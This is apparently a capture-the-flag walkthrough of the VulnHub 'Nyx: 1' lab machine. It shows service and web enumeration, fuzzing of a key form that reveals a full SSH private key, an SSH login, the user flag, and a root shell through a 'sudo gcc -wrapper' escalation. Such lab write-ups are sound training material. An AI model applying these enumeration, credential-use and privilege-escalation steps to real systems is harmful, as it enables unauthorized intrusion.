# Nyx 1

**About release**

* Name: Nyx: 1
* Date release: 15 Aug 2020
* Author: 0xatom
* Series: Nyx

**Description**

This is an easy box, pretty basic stuff.

It's vmware based, i dont know if it works on VB you can test it if you want.

There are 2 flags under /home/$user/user.txt & /root/root.txt.

No stupid ctfy/guessy stuff.

For any help/hint feel free to DM me through discord.

Happy pwning! :D

**Download**

* File name: nyxvm.zip (Size: 837 MB)
* Download: https://mega.nz/file/guBFQYpT#ouUXdG795C2ZJ1aCgbQm76MiYYjTJIGigjjBq0YXaJY
* Download (Mirror): https://download.vulnhub.com/nyx/nyxvm.zip
* Download (Torrent): https://download.vulnhub.com/nyx/nyxvm.zip.torrent ([Magnet](magnet:?xt=urn:btih:7F2FDB30F2B5857DA3729CBE8D76163F4E8398A1&dn=nyxvm.zip&tr=http%3A%2F%2Ftracker.vulnhub.com%3A6969/announce&tr=udp%3A%2F%2Ftracker.vulnhub.com%3A6969/announce&tr=udp%3A%2F%2Ftracker.openbittorrent.com%3A80/announce&tr=udp%3A%2F%2Ftracker.publicbt.com%3A80/announce&tr=udp%3A%2F%2Ftracker.istole.it%3A6969))

# User flag

## Services enumeration

Let's start by enumerating services running on the target:

~~~
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
| ssh-hostkey: 
|   2048 fc:8b:87:f4:36:cd:7d:0f:d8:f3:16:15:a9:47:f1:0b (RSA)
|   256 b4:5c:08:96:02:c6:a8:0b:01:fd:49:68:dd:aa:fb:3a (ECDSA)
|_  256 cb:bf:22:93:69:76:60:a4:7d:c0:19:f3:c7:15:e7:3c (ED25519)
80/tcp open  http    Apache httpd 2.4.38 ((Debian))
|_http-server-header: Apache/2.4.38 (Debian)
|_http-title: nyx
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
~~~

## Web enumeration

This is my solution without cheating. I started by enumerating hidden files and directories on the web service and discovered a hidden `/key.php` file:

~~~
kali@kali:/data/Nyx$ gobuster dir -u http://nyx.box -x php,txt,bak,old,zip,tar,gz,conf,cnf,js -w /usr/share/wordlists/dirb/common.txt
===============================================================
Gobuster v3.0.1
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)
===============================================================
[+] Url:            http://nyx.box
[+] Threads:        10
[+] Wordlist:       /usr/share/wordlists/dirb/common.txt
[+] Status codes:   200,204,301,302,307,401,403
[+] User Agent:     gobuster/3.0.1
[+] Extensions:     tar,cnf,txt,old,zip,gz,conf,js,php,bak
[+] Timeout:        10s
===============================================================
2020/09/24 08:40:31 Starting gobuster
===============================================================

[REDACTED]

/index.html (Status: 200)
/key.php (Status: 200)
/server-status (Status: 403)
/server-status (Status: 403)
===============================================================
2020/09/24 08:46:52 Finished
===============================================================
~~~

## key.php

Connecting to http://nyx.box/key.php shows a form where a key is prompted.

```html
<center><h3>try harder kiddo</h3></center>
<html>
<head>
<title>key</title>
</head>
<body>
<center>
<h2>can u find the key!?</h2>
<form action="" method="POST">
    Enter the key: <input type="text" name="key"/>
    <input type="submit" value="submit">
</form>
</center>
</body>
</html>
```

After trying some strings, numbers and commands injections without success, I decided to fuzz the form with `wfuzz`, and discovered 3 keys that led to a different response length:

~~~
kali@kali:/data/Nyx/files$ wfuzz -z file,/usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -d "key=FUZZ" --hh 287 http://nyx.box/key.php

Warning: Pycurl is not compiled against Openssl. Wfuzz might not work correctly when fuzzing SSL sites. Check Wfuzz's documentation for more information.

********************************************************
* Wfuzz 2.4.5 - The Web Fuzzer                         *
********************************************************

Target: http://nyx.box/key.php
Total requests: 220560

===================================================================
ID           Response   Lines    Word     Chars       Payload                                             
===================================================================

000000259:   200        15 L     29 W     282 Ch      "admin"                                             
000002247:   200        15 L     29 W     282 Ch      "root"                                              
000100067:   302        0 L      0 W      0 Ch        "1165685715469"                                     
~~~

## SSH private key

`admin` and `root` were obviously not good (the message is `really? lol`), but entering `1165685715469` redirected me to http://nyx.box/d41d8cd98f00b204e9800998ecf8427e.php where I was provided with `mpampis`'s SSH private key:

~~~
kali@kali:/data/Nyx/files$ curl -X POST -L -d "key=1165685715469" http://nyx.box/key.php
<title>mpampis key</title>
<pre>
-----BEGIN OPENSSH PRIVATE KEY-----
b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAABFwAAAAdzc2gtcn
NhAAAAAwEAAQAAAQEA7T94TmbqiRlc6jGh6UOKyKVux+bYoskAdOybtgCfoh064CTHLTMT
HNnXWI8sT1Ml19svvVGnZZKmDTbS/7uOpgsmvO0pmqirCVo0UvD0YhKXVEwkTtmUvPBPAX
ucGRtefJcCtLWnSc4yMtzbYzSYEultUW5EfqqTwfjh48fxvLk1/kznO7EknxpLMupf6hJz
NbGLLbRwINeIjdC0k6iMdMrZ3n58Cho3kigNKSqcyBpkePE+RvnCBegtxBX/m1pUjPjYKY
zdZ0DROQyU3t7Wu6iX4TW688adHjAgXP7ERN0tL6RoJB9vHxO1GmGt5CLoJBYND1uLoTRe
p7xkIPwwgwAAA8iiu9/dorvf3QAAAAdzc2gtcnNhAAABAQDtP3hOZuqJGVzqMaHpQ4rIpW
7H5tiiyQB07Ju2AJ+iHTrgJMctMxMc2ddYjyxPUyXX2y+9UadlkqYNNtL/u46mCya87Sma
qKsJWjRS8PRiEpdUTCRO2ZS88E8Be5wZG158lwK0tadJzjIy3NtjNJgS6W1RbkR+qpPB+O
Hjx/G8uTX+TOc7sSSfGksy6l/qEnM1sYsttHAg14iN0LSTqIx0ytnefnwKGjeSKA0pKpzI
GmR48T5G+cIF6C3EFf+bWlSM+NgpjN1nQNE5DJTe3ta7qJfhNbrzxp0eMCBc/sRE3S0vpG
gkH28fE7UaYa3kIugkFg0PW4uhNF6nvGQg/DCDAAAAAwEAAQAAAQAaUzieOn07yTyuH+O/
Zmc37GNmew7+wR7z2m1MvLT54BRwWqRfN5OfV+y1Pu3Dv44rbX7WmwDgHG2gebzf84fYlN
QvkoFTT/Pqjb/QlDwJxdZU3D4LIcmHTYL2vyiLAKZzXK5ILv/pCKA5VJhjYaqeLpiauImR
JIxQsbUe+UixkATg7u3c/lkPH4p7POb7JJVbemKO07vzUSK3wzMWSukZs5ZZXKH8L5ypSy
CxPe4AUaO5IuXeKPeq45Q7lUvVKAFdxte438jup4YeyS7lbi2+BggJLt3W4jAlrWxaDhK3
/EICCIT8zLt+baltm/xrfiRM2OxTP2S/6/AQlkbSOaBBAAAAgQDTmKPk3pBpmR0tm5KmSK
6ubJkOfjcVwsLlZcVDHOcFIrgbNkEZPqqEnnRQD7BSBz0I05L1H8VgDR4ZkkgVqKmePhI9
Fs3NVsCasih8UubG2TTsGcvOalU+X6zagDiGWxxLNrQ81NBmCUBWPB/dFG+dUo9T0XigNQ
1lD1s4trUG6QAAAIEA/BlxOWPyLx4UHGO7RrrKEjWKpw2Ma6iRbQOo5HfmrJ+mZvUP+qBs
+Qgj3g+Qgt6y+EH67oxWeX/xTti1xHAc0Qx59181QrBFojp0XWtRumhASFC/TceBuP1fYe
DIZ6gYNXN/Pw7PFKStceO/Qhmee+K1/6XRwEvRSvXKG5a7sQ8AAACBAPDrM5bkjXYD9cq7
xfkT1t16YzqK9BmgFgSyOFQjtqFuLt4JtsQhPfip2QZkSCyPk8cVNx74Wvs4rxYl5pacmf
CR8v83WYMc6h4oBLmcxZsxMpaP8B/N7DZeS76A6idz+Cdj6BTmgMh7xFTXQOgB6Gh9LZmE
KXo/rW1gDQ8R+yFNAAAAC21wYW1waXNAbnl4AQIDBAUGBw==
-----END OPENSSH PRIVATE KEY-----
</pre>
~~~

Give it appropriate rights and use it to connect via SSH on the target:

~~~
kali@kali:/data/Nyx/files$ chmod 400 mpampis.key 
kali@kali:/data/Nyx/files$ ssh -i mpampis.key mpampis@nyx.box
The authenticity of host 'nyx.box (172.16.222.140)' can't be established.
ECDSA key fingerprint is SHA256:cWZ98h8RGIn8QlSU1peM8ADzbWfZAK94zE4P59yvPq8.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added 'nyx.box,172.16.222.140' (ECDSA) to the list of known hosts.
Linux nyx 4.19.0-10-amd64 #1 SMP Debian 4.19.132-1 (2020-07-24) x86_64
███▄▄▄▄   ▄██   ▄   ▀████    ▐████▀ 
███▀▀▀██▄ ███   ██▄   ███▌   ████▀  
███   ███ ███▄▄▄███    ███  ▐███    
███   ███ ▀▀▀▀▀▀███    ▀███▄███▀    
███   ███ ▄██   ███    ████▀██▄     
███   ███ ███   ███   ▐███  ▀███    
███   ███ ███   ███  ▄███     ███▄  
 ▀█   █▀   ▀█████▀  ████       ███▄ 
Last login: Fri Aug 14 19:15:05 2020 from 192.168.1.18
~~~

## User flag

Let's get the user flag:

~~~
mpampis@nyx:~$ cd
mpampis@nyx:~$ ls -la
total 36
drwxr-xr-x 4 mpampis mpampis 4096 Aug 14 19:42 .
drwxr-xr-x 3 root    root    4096 Aug 14 17:13 ..
-rw------- 1 mpampis mpampis  490 Aug 14 19:47 .bash_history
-rw-r--r-- 1 mpampis mpampis  220 Aug 14 17:13 .bash_logout
-rw-r--r-- 1 mpampis mpampis 3526 Aug 14 17:13 .bashrc
drwxr-xr-x 3 mpampis mpampis 4096 Aug 14 18:07 .local
-rw-r--r-- 1 mpampis mpampis  807 Aug 14 17:13 .profile
drwx------ 2 mpampis mpampis 4096 Aug 14 18:07 .ssh
-rw-r--r-- 1 root    root      33 Aug 14 17:27 user.txt
mpampis@nyx:~$ cat user.txt 
2cb67a256530577868009a5944d12637
~~~

# Root flag

## Checking privileges

The user is allowed to run `gcc` without password:

~~~
mpampis@nyx:~$ sudo -l
Matching Defaults entries for mpampis on nyx:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User mpampis may run the following commands on nyx:
    (root) NOPASSWD: /usr/bin/gcc
~~~

## Privilege escalation and root flag

Checking on [GTFOBins](https://gtfobins.github.io/gtfobins/gcc/#sudo), we confirm that there is a privesc with `gcc`. Let's elevate to root and get the root flag:

~~~
mpampis@nyx:~$ sudo gcc -wrapper /bin/sh,-s .
# id
uid=0(root) gid=0(root) groups=0(root)
# cat /root/root.txt
# cd /root
# ls -la
total 24
drwx------  3 root root 4096 Aug 14 18:58 .
drwxr-xr-x 18 root root 4096 Aug 14 16:58 ..
-rw-------  1 root root    0 Aug 14 18:58 .bash_history
-rw-r--r--  1 root root  570 Jan 31  2010 .bashrc
drwxr-xr-x  3 root root 4096 Aug 14 17:24 .local
-rw-r--r--  1 root root  148 Aug 17  2015 .profile
-rw-r--r--  1 root root    0 Aug 14 17:26 root.txt
-rw-r--r--  1 root root  168 Aug 14 18:17 .wget-hsts
~~~

Unfortunately, the root flag is empty (file size is 0) and there is no other `root.txt` file on the target. Not sure if it's a bug?
